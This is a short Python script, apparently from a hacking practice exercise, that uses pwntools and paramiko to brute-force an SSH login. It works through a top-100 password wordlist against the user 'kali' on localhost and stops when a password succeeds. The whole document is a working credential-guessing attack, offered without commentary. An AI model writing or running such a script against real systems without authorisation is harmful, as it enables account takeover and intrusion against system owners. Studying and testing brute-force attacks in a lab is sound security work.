from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("10-million-password-list-top-100.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: '{password}'!")
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print(f"[>] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1